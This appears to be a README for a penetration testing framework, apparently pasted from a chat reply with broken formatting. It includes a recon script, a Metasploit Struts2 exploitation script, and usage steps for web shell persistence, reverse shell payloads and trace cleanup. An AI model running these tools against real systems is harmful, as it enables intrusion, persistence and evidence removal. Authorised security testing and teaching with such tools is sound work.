    2. Repository Description
Repository Name: Advanced-Penetration-Testing-Framework

Description:
An all-in-one framework for conducting penetration tests, from initial reconnaissance to exploitation, post-exploitation, and reporting. This framework integrates multiple penetration testing tools and automates various tasks to streamline the workflow.

License: MIT (or another open-source license)

reporting/: Tools for creating reports post-exploitation.

report_generator.py – A script to generate penetration test reports based on gathered data.
html_report.sh – Shell script that outputs a formatted HTML report.
payloads/: Custom payloads for various exploits.

reverse_shell.py – Reverse shell payload in Python.
meterpreter_payload.sh – Metasploit payload generator script.
utilities/: Miscellaneous utilities for various tasks.

cleaner.py – A tool to clean up after a test (remove traces, kill processes).
dns_spoofing.py – Python script to conduct DNS spoofing attacks.
ssh_key_finder.py – A script to find SSH keys on a system.
4. Example Scripts
Reconnaissance Script (recon_script.sh)
This script automates the process of gathering public information about a target using various open-source tools.

bash
Copy code
#!/bin/bash
# Automated Reconnaissance Script
echo "[*] Starting Reconnaissance..."

# Perform WHOIS lookup
whois $1 > recon_results/whois.txt
echo "[*] WHOIS lookup completed."

# Perform DNS lookup
dig $1 > recon_results/dns.txt
echo "[*] DNS lookup completed."

# Subdomain enumeration using Sublist3r
sublist3r -d $1 -o recon_results/subdomains.txt
echo "[*] Subdomain enumeration completed."

# Google dorking
python3 tools/recon/google_dork.py $1 > recon_results/google_dorks.txt
echo "[*] Google dorking completed."

echo "[*] Reconnaissance completed."
Exploitation Script (exploitation_script.sh)
This script uses Metasploit to exploit a vulnerability in the target system.

bash
Copy code
#!/bin/bash
# Automated Exploitation Script
echo "[*] Starting Exploitation..."

# Set target IP and port
TARGET=$1
PORT=80

# Use Metasploit to exploit vulnerability
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS $TARGET; set RPORT $PORT; run" > exploitation_results.txt

echo "[*] Exploitation completed. Check exploitation_results.txt for details."

#### **usage.md**

Guide on how to use various scripts and tools within the framework.

```markdown
# Advanced Penetration Testing Framework Usage Guide

## Reconnaissance

1. To perform WHOIS and DNS enumeration:
```bash
./scripts/recon_script.sh <target-domain>
Exploitation
To run an automated exploitation using Metasploit:
bash
Copy code
./scripts/exploitation_script.sh <target-ip>
Post-Exploitation
For web shell persistence:
bash
Copy code
./scripts/post_exploitation_script.sh <target-ip>
Report Generation
To generate an automated HTML report:
bash
Copy code
python3 tools/reporting/report_generator.py --target <target-ip>
bash
Copy code

#### **examples.md**

Provides examples of various penetration testing scenarios.

```markdown
# Advanced Penetration Testing Framework Examples

### Example 1: Automated Reconnaissance
Run the reconnaissance script to gather basic information about a target domain:
```bash
./scripts/recon_script.sh example.com
Example 2: Exploiting a Remote Code Execution Vulnerability
Exploit a vulnerability in a web application:

bash
Copy code
./scripts/exploitation_script.sh 192.168.1.1
Example 3: Post-Exploitation with Web Shell Persistence
Establish persistence by uploading a web shell:

bash
Copy code
./scripts/post_exploitation_script.sh 192.168.1.1
pgsql
Copy code
